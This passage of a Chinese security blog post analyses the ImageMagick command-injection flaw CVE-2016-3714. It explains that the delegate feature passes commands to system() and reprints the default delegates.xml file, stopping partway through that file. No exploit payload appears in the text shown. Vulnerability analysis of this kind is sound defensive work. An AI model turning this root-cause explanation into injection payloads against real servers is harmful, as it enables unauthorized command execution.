

<html class="no-js">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="keywords" content="" />
    <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。" />
    <title>CVE-2016-3714 - ImageMagick 命令执行分析 | 离别歌</title>
    <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌" />
    <link href="../static/deep/css/base.css" rel="stylesheet" type="text/css" />
    <link href="../static/deep/css/style.css" rel="stylesheet" type="text/css" />
    <link rel="shortcut icon" href="../static/deep/images/favicon.ico" />
    
<style>div.row .col-xs-4 {
  float: left;
  margin-left: 4px;
}
div.row .col-xs-4 img {
  margin-left: 5px;
}
</style>
<link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
<link rel="stylesheet" href="../static/deep/css/code.css">

</head>
<body>
<!--[if lt IE 8]>
    <div class="browsehappy" role="dialog">当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.</div>
<![endif]-->
<div id="header">
    <div class="container">
        <h1 class="h1-title">
            <a href="../index.html">
               <img src="../static/deep/images/logo.png" alt="离别歌" />
            </a>
        </h1>
        <div id="nav">
        <input type="checkbox" id="button">
        <label for="button" onclick>菜单</label>
        
        <ul>
            
            <li class="item ">
                <a href="../index.html" >首页</a>
            </li>
            
            <li class="item ">
                <a href="../list/index.html" >文章</a>
            </li>
            
            <li class="item ">
                <a href="../other/tinger.html" >关于</a>
            </li>
            
            <li class="item ">
                <a href="../other/friends-link.html" >友链</a>
            </li>
            
            <li class="item ">
                <a href="https://github.com/phith0n" target="_blank" >项目</a>
            </li>
            
            <li class="item ">
                <a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" >代码审计</a>
            </li>
            
        </ul>
        
        </div>
    </div>
</div>

<div class="banner-bar">
    <div class="container">
        <div class="col-12 columns">
            <div class="place">
                <a href="../index.html">首页</a>
                &raquo;
                
                网络安全 &raquo; <a href="CVE-2016-3714-ImageMagick.html">CVE-2016-3714 - ImageMagick 命令执行分析</a>
                
            </div>
        </div>
    </div>
</div>
<div class="container">
    <div class="col-11 columns" id="mainbody" role="main">
        <div class="post-single type-post">
            <h1 class="article-h1">CVE-2016-3714 - ImageMagick 命令执行分析</h1>
            <div class="details-up">
  <span class="author">作者: None</span>
  
  <span class="category">分类: <a href="../sort/PENETRATION.html">网络安全</a></span>
  
  <span class="date">时间: 2016-5-8 1:33</span>
  <span class="comments-top" itemprop="interactionCount">评论：<a itemprop="discussionUrl" href="#reply-list">6条评论</a></span>
  <span class="comments-top" itemprop="interactionCount">浏览：<a itemprop="discussionUrl" href="CVE-2016-3714-ImageMagick.html">22529人看过</a></span>
  
  <span class="date">标签:
    
        <a href="../tag/ImageMagick.html">ImageMagick</a>
    
        <a href="../tag/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html">命令执行漏洞</a>
    
  </span>
  
</div>
            <div class="entry">
                <p>ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。但近来有研究者发现，当用户传入一个包含『畸形内容』的图片的时候，就有可能触发命令注入漏洞。</p>
<p>国外的安全人员为此新建了一个网站： <a href="https://imagetragick.com/"><a href="https://imagetragick.com/">https://imagetragick.com/</a></a> ，不得不说，有些外国人蛮会玩的。</p>
<p>相对于之前的数个拥有『主页』的漏洞，这个洞确实不一般，确实是一个可以被利用的好洞，乌云主站上也爆出了数个被该漏洞影响的大厂商。我们先来分析一下它出现的原因。</p>
<h2 id="_1"><a class="toclink" href="#_1">原理分析</a></h2>
<p>与这个漏洞相关的CVE有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717，其中最严重的就是CVE-2016-3714，利用这个漏洞可以造成远程命令执行的危害。</p>
<p>ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的（ <a href="https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L347"><a href="https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L347">https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L347</a></a> ）</p>
<p>我们在ImageMagick的默认配置文件里可以看到所有的委托： /etc/ImageMagick/delegates.xml</p>
<div class="codehilite"><pre><span></span><span class="o">&lt;?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s">&quot;1.0&quot;</span> <span class="n">encoding</span><span class="o">=</span><span class="s">&quot;UTF-8&quot;</span><span class="o">?&gt;</span>
<span class="o">&lt;!</span><span class="n">DOCTYPE</span> <span class="n">delegatemap</span> <span class="p">[</span>
<span class="o">&lt;!</span><span class="n">ELEMENT</span> <span class="n">delegatemap</span> <span class="p">(</span><span class="n">delegate</span><span class="p">)</span><span class="o">+&gt;</span>
<span class="o">&lt;!</span><span class="n">ELEMENT</span> <span class="n">delegate</span> <span class="p">(</span><span class="cp">#PCDATA</span><span class="p">)</span><span class="o">&gt;</span>
<span class="o">&lt;!</span><span class="n">ATTLIST</span> <span class="n">delegate</span> <span class="n">decode</span> <span class="n">CDATA</span> <span class="cp">#IMPLIED</span><span class="o">&gt;</span>
<span class="o">&lt;!</span><span class="n">ATTLIST</span> <span class="n">delegate</span> <span class="n">encode</span> <span class="n">CDATA</span> <span class="cp">#IMPLIED</span><span class="o">&gt;</span>
<span class="o">&lt;!</span><span class="n">ATTLIST</span> <span class="n">delegate</span> <span class="n">mode</span> <span class="n">CDATA</span> <span class="cp">#IMPLIED</span><span class="o">&gt;</span>
<span class="o">&lt;!</span><span class="n">ATTLIST</span> <span class="n">delegate</span> <span class="n">spawn</span> <span class="n">CDATA</span> <span class="cp">#IMPLIED</span><span class="o">&gt;</span>
<span class="o">&lt;!</span><span class="n">ATTLIST</span> <span class="n">delegate</span> <span class="n">stealth</span> <span class="n">CDATA</span> <span class="cp">#IMPLIED</span><span class="o">&gt;</span>
<span class="o">&lt;!</span><span class="n">ATTLIST</span> <span class="n">delegate</span> <span class="kr">thread</span><span class="o">-</span><span class="n">support</span> <span class="n">CDATA</span> <span class="cp">#IMPLIED</span><span class="o">&gt;</span>
<span class="o">&lt;!</span><span class="n">ATTLIST</span> <span class="n">delegate</span> <span class="n">command</span> <span class="n">CDATA</span> <span class="cp">#REQUIRED</span><span class="o">&gt;</span>
<span class="p">]</span><span class="o">&gt;</span>
<span class="o">&lt;!--</span>
<span class="n">Delegate</span> <span class="n">command</span> <span class="n">file</span><span class="p">.</span>

<span class="n">Commands</span> <span class="n">which</span> <span class="n">specify</span>

<span class="n">decode</span><span class="o">=</span><span class="s">&quot;in_format&quot;</span> <span class="n">encode</span><span class="o">=</span><span class="s">&quot;out_format&quot;</span>

<span class="n">specify</span> <span class="n">the</span> <span class="n">rules</span> <span class="k">for</span> <span class="n">converting</span> <span class="n">from</span> <span class="n">in_format</span> <span class="n">to</span> <span class="n">out_format</span> <span class="n">These</span>
<span class="n">rules</span> <span class="n">may</span> <span class="n">be</span> <span class="n">used</span> <span class="n">to</span> <span class="n">translate</span> <span class="n">directly</span> <span class="n">between</span> <span class="n">formats</span><span class="p">.</span>

<span class="n">Commands</span> <span class="n">which</span> <span class="n">specify</span> <span class="n">only</span>

<span class="n">decode</span><span class="o">=</span><span class="s">&quot;in_format&quot;</span>

<span class="n">specify</span> <span class="n">the</span> <span class="n">rules</span> <span class="k">for</span> <span class="n">converting</span> <span class="n">from</span> <span class="n">in_format</span> <span class="n">to</span> <span class="n">some</span> <span class="n">format</span> <span class="n">that</span>
<span class="n">ImageMagick</span> <span class="n">will</span> <span class="n">automatically</span> <span class="n">recognize</span><span class="p">.</span> <span class="n">These</span> <span class="n">rules</span> <span class="n">are</span> <span class="n">used</span> <span class="n">to</span>
<span class="n">decode</span> <span class="n">formats</span><span class="p">.</span>

<span class="n">Commands</span> <span class="n">which</span> <span class="n">specify</span> <span class="n">only</span>

<span class="n">encode</span><span class="o">=</span><span class="s">&quot;out_format&quot;</span>

<span class="n">specify</span> <span class="n">the</span> <span class="n">rules</span> <span class="k">for</span> <span class="n">an</span> <span class="s">&quot;encoder&quot;</span> <span class="n">which</span> <span class="n">may</span> <span class="n">accept</span> <span class="n">any</span> <span class="n">input</span> <span class="n">format</span><span class="p">.</span>

<span class="n">For</span> <span class="n">delegates</span> <span class="n">other</span> <span class="n">than</span> <span class="nl">ps</span><span class="p">:</span><span class="o">*</span><span class="p">,</span> <span class="nl">pcl</span><span class="p">:</span><span class="o">*</span><span class="p">,</span> <span class="n">and</span> <span class="nl">mpeg</span><span class="p">:</span><span class="o">*</span> <span class="n">the</span> <span class="n">substitution</span> <span class="n">rules</span> <span class="n">are</span>
<span class="n">as</span> <span class="nl">follows</span><span class="p">:</span>

<span class="nf">%i</span>  <span class="n">input</span> <span class="n">image</span> <span class="n">filename</span>
<span class="nf">%o</span>  <span class="n">output</span> <span class="n">image</span> <span class="n">filename</span>
<span class="nf">%u</span>  <span class="n">unique</span> <span class="n">temporary</span> <span class="n">filename</span>
<span class="o">%</span><span class="n">Z</span>  <span class="n">unique</span> <span class="n">temporary</span> <span class="n">filename</span>
<span class="o">%</span><span class="err">#</span>  <span class="n">input</span> <span class="n">image</span> <span class="n">signature</span>
<span class="nf">%b</span>  <span class="n">image</span> <span class="n">file</span> <span class="n">size</span>
<span class="nf">%c</span>  <span class="n">input</span> <span class="n">image</span> <span class="n">comment</span>
<span class="nf">%g</span>  <span class="n">image</span> <span class="n">geometry</span>
<span class="nf">%h</span>  <span class="n">image</span> <span class="n">rows</span> <span class="p">(</span><span class="n">height</span><span class="p">)</span>
<span class="nf">%k</span>  <span class="n">input</span> <span class="n">image</span> <span class="n">number</span> <span class="n">colors</span>
<span class="nf">%l</span>  <span class="n">image</span> <span class="n">label</span>
<span class="nf">%m</span>  <span class="n">input</span> <span class="n">image</span> <span class="n">format</span>
<span class="nf">%p</span>  <span class="n">page</span> <span class="n">number</span>
<span class="nf">%q</span>  <span class="n">input</span> <span class="n">image</span> <span class="n">depth</span>
<span class="nf">%s</span>  <span class="n">scene</span> <span class="n">number</span>
<span class="nf">%w</span>  <span class="n">image</span> <span class="n">columns</span> <span class="p">(</span><span class="n">width</span><span class="p">)</span>
<span class="nf">%x</span>  <span class="n">input</span> <span class="n">image</span> <span class="n">x</span> <span class="n">resolution</span>
<span class="nf">%y</span>  <span class="n">input</span> <span class="n">image</span> <span class="n">y</span> <span class="n">resolution</span>

<span class="n">Set</span> <span class="n">option</span> <span class="nl">delegate</span><span class="p">:</span><span class="n">bimodal</span><span class="o">=</span><span class="nb">true</span> <span class="n">to</span> <span class="n">process</span> <span class="n">bimodal</span> <span class="n">delegates</span> <span class="n">otherwise</span> <span class="n">they</span>
<span class="n">are</span> <span class="n">ignored</span><span class="p">.</span>

<span class="n">If</span> <span class="n">stealth</span><span class="o">=</span><span class="s">&quot;True&quot;</span> <span class="n">the</span> <span class="n">delegate</span> <span class="n">is</span> <span class="n">not</span> <span class="n">listed</span> <span class="n">in</span> <span class="n">user</span> <span class="n">requested</span>
<span class="s">&quot;-list delegate&quot;</span> <span class="n">listings</span><span class="p">.</span> <span class="n">These</span> <span class="n">are</span> <span class="n">typically</span> <span class="n">special</span> <span class="n">internal</span> <span class="n">delegates</span><span class="p">.</span>

<span class="n">If</span> <span class="n">spawn</span><span class="o">=</span><span class="s">&quot;True&quot;</span> <span class="n">ImageMagick</span> <span class="n">will</span> <span class="n">not</span> <span class="n">way</span> <span class="k">for</span> <span class="n">the</span> <span class="n">delegate</span> <span class="n">to</span> <span class="n">finish</span><span class="p">,</span>
<span class="n">nor</span> <span class="n">will</span> <span class="n">it</span> <span class="n">read</span> <span class="n">any</span> <span class="n">output</span> <span class="n">image</span><span class="p">.</span>  <span class="n">It</span> <span class="n">will</span> <span class="n">only</span> <span class="n">wait</span> <span class="k">for</span> <span class="n">either</span> <span class="n">the</span> <span class="n">input</span>
<span class="n">file</span> <span class="n">to</span> <span class="n">be</span> <span class="n">removed</span> <span class="p">(</span><span class="n">See</span> <span class="s">&quot;ephemeral:&quot;</span> <span class="n">coder</span><span class="p">)</span> <span class="n">indicating</span> <span class="n">that</span> <span class="n">the</span> <span class="n">input</span> <span class="n">file</span>
<span class="n">has</span> <span class="n">been</span> <span class="n">read</span><span class="p">,</span> <span class="n">or</span> <span class="n">a</span> <span class="n">maximum</span> <span class="n">time</span> <span class="n">limit</span> <span class="n">of</span> <span class="mi">2</span> <span class="n">seconds</span><span class="p">.</span>
<span class="o">--&gt;</span>
<span class="o">&lt;</span><span class="n">delegatemap</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;autotrace&quot;</span> <span class="n">stealth</span><span class="o">=</span><span class="s">&quot;True&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;convert&amp;quot; &amp;quot;%i&amp;quot; &amp;quot;pnm:%u&amp;quot;</span><span class="se">\n</span><span class="s">&amp;quot;autotrace&amp;quot; -input-format pnm -output-format svg -output-file &amp;quot;%o&amp;quot; &amp;quot;%u&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;blender&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;blender&amp;quot; -b &amp;quot;%i&amp;quot; -F PNG -o &amp;quot;%o&amp;quot;&amp;quot;</span><span class="se">\n</span><span class="s">&amp;quot;convert&amp;quot; -concatenate &amp;quot;%o*.png&amp;quot; &amp;quot;%o&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;browse&quot;</span> <span class="n">stealth</span><span class="o">=</span><span class="s">&quot;True&quot;</span> <span class="n">spawn</span><span class="o">=</span><span class="s">&quot;True&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;xdg-open&amp;quot; http://www.imagemagick.org/; rm &amp;quot;%i&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;cdr&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;uniconvertor&amp;quot; &amp;quot;%i&amp;quot; &amp;quot;%o.svg&amp;quot;; mv &amp;quot;%o.svg&amp;quot; &amp;quot;%o&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;cgm&quot;</span> <span class="kr">thread</span><span class="o">-</span><span class="n">support</span><span class="o">=</span><span class="s">&quot;False&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;ralcgm&amp;quot; -d ps -oC &amp;lt; &amp;quot;%i&amp;quot; &amp;gt; &amp;quot;%o&amp;quot; 2&amp;gt; &amp;quot;%Z&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;dvi&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;dvips&amp;quot; -q -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;dng:decode&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;ufraw-batch&amp;quot; --silent --create-id=also --out-type=png --out-depth=16 &amp;quot;--output=%u.png&amp;quot; &amp;quot;%i&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;dot&quot;</span> <span class="n">command</span><span class="o">=</span><span class="err">&#39;</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="n">dot</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span> <span class="o">-</span><span class="n">Tsvg</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="nf">%i</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span> <span class="o">-</span><span class="n">o</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="nf">%o</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="err">&#39;</span> <span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;edit&quot;</span> <span class="n">stealth</span><span class="o">=</span><span class="s">&quot;True&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;/etc/alternatives/x-terminal-emulator&amp;quot; -title &amp;quot;Edit Image Comment&amp;quot; -e vi &amp;quot;%o&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;eps&quot;</span> <span class="n">encode</span><span class="o">=</span><span class="s">&quot;pdf&quot;</span> <span class="n">mode</span><span class="o">=</span><span class="s">&quot;bi&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 &amp;quot;-sDEVICE=pdfwrite&amp;quot; &amp;quot;-sOutputFile=%o&amp;quot; &amp;quot;-f%i&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;eps&quot;</span> <span class="n">encode</span><span class="o">=</span><span class="s">&quot;ps&quot;</span> <span class="n">mode</span><span class="o">=</span><span class="s">&quot;bi&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=nodevice&amp;quot; &amp;quot;-sOutputFile=%o&amp;quot; &amp;quot;-f%i&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;fig&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;fig2dev&amp;quot; -L ps &amp;quot;%i&amp;quot; &amp;quot;%o&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;plt&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;echo&amp;quot; &amp;quot;set size 1.25,0.62; set terminal postscript portrait color solid; set output </span><span class="se">\&#39;</span><span class="s">%o</span><span class="se">\&#39;</span><span class="s">; load </span><span class="se">\&#39;</span><span class="s">%i</span><span class="se">\&#39;</span><span class="s">&amp;quot; &amp;gt; &amp;quot;%u&amp;quot;;&amp;quot;gnuplot&amp;quot; &amp;quot;%u&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;hpg&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;hp2xx&amp;quot; -q -m eps -f `basename &amp;quot;%o&amp;quot;` &amp;quot;%i&amp;quot;;     mv -f `basename &amp;quot;%o&amp;quot;` &amp;quot;%o&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;hpgl&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;if [ -e hp2xx -o -e /usr/bin/hp2xx ]; then     hp2xx -q -m eps -f `basename &amp;quot;%o&amp;quot;` &amp;quot;%i&amp;quot;;     mv -f `basename &amp;quot;%o&amp;quot;` &amp;quot;%o&amp;quot;;   else     echo &amp;quot;You need to install hp2xx to use HPGL files with ImageMagick.&amp;quot;;     exit 1;   fi&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;htm&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;html2ps&amp;quot; -U -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;html&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;html2ps&amp;quot; -U -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;https&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;curl&amp;quot; -s -k -o &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;ilbm&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;ilbmtoppm&amp;quot; &amp;quot;%i&amp;quot; &amp;gt; &amp;quot;%o&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;man&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;groff&amp;quot; -man -Tps &amp;quot;%i&amp;quot; &amp;gt; &amp;quot;%o&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;mpeg:decode&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;ffmpeg&amp;quot; -v -1 -i &amp;quot;%i&amp;quot; -vframes %S -vcodec pam -an -f rawvideo -y &amp;quot;%u.pam&amp;quot; 2&amp;gt; &amp;quot;%Z&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">encode</span><span class="o">=</span><span class="s">&quot;mpeg:encode&quot;</span> <span class="n">stealth</span><span class="o">=</span><span class="s">&quot;True&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;ffmpeg&amp;quot; -v -1 -mbd rd -trellis 2 -cmp 2 -subcmp 2 -g 300 -i &amp;quot;%M%%d.jpg&amp;quot; &amp;quot;%u.%m&amp;quot; 2&amp;gt; &amp;quot;%Z&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;sid&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;mrsidgeodecode&amp;quot; -if sid -i &amp;quot;%i&amp;quot; -of tif -o &amp;quot;%o&amp;quot; &amp;gt; &amp;quot;%u&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;pcl:color&quot;</span> <span class="n">stealth</span><span class="o">=</span><span class="s">&quot;True&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;pcl6&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=ppmraw&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;%s&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;pcl:cmyk&quot;</span> <span class="n">stealth</span><span class="o">=</span><span class="s">&quot;True&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;pcl6&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pamcmyk32&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;%s&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;pcl:mono&quot;</span> <span class="n">stealth</span><span class="o">=</span><span class="s">&quot;True&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;pcl6&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=pbmraw&amp;quot; -dTextAlphaBits=%u -dGraphicsAlphaBits=%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile=%s&amp;quot; &amp;quot;%s&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;pdf&quot;</span> <span class="n">encode</span><span class="o">=</span><span class="s">&quot;eps&quot;</span> <span class="n">mode</span><span class="o">=</span><span class="s">&quot;bi&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=epswrite&amp;quot; &amp;quot;-sOutputFile=%o&amp;quot; &amp;quot;-f%i&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;pdf&quot;</span> <span class="n">encode</span><span class="o">=</span><span class="s">&quot;ps&quot;</span> <span class="n">mode</span><span class="o">=</span><span class="s">&quot;bi&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=nodevice&amp;quot; &amp;quot;-sOutputFile=%o&amp;quot; &amp;quot;-f%i&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;tiff&quot;</span> <span class="n">encode</span><span class="o">=</span><span class="s">&quot;launch&quot;</span> <span class="n">mode</span><span class="o">=</span><span class="s">&quot;encode&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;gimp&amp;quot; &amp;quot;%i&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;pnm&quot;</span> <span class="n">encode</span><span class="o">=</span><span class="s">&quot;ilbm&quot;</span> <span class="n">mode</span><span class="o">=</span><span class="s">&quot;encode&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;ppmtoilbm&amp;quot; -24if &amp;quot;%i&amp;quot; &amp;gt; &amp;quot;%o&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;pov&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;povray&amp;quot; &amp;quot;+i%i&amp;quot; -D0 &amp;quot;+o%o&amp;quot; +fn%q +w%w +h%h +a -q9 &amp;quot;-kfi%s&amp;quot; &amp;quot;-kff%n&amp;quot;;&amp;quot;convert&amp;quot; -concatenate &amp;quot;%o*.png&amp;quot; &amp;quot;%o&amp;quot;&quot;</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="n">delegate</span> <span class="n">decode</span><span class="o">=</span><span class="s">&quot;ps&quot;</span> <span class="n">encode</span><span class="o">=</span><span class="s">&quot;eps&quot;</span> <span class="n">mode</span><span class="o">=</span><span class="s">&quot;bi&quot;</span> <span class="n">command</span><span class="o">=</span><span class="s">&quot;&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 &amp;quot;-sDEVICE=epswrite&amp;quot; &amp;quot;-sOutputFile=%o&amp;quot; &amp;quot;-f%i&amp;quot;&quot;</span><span class="o">/&gt;</span>
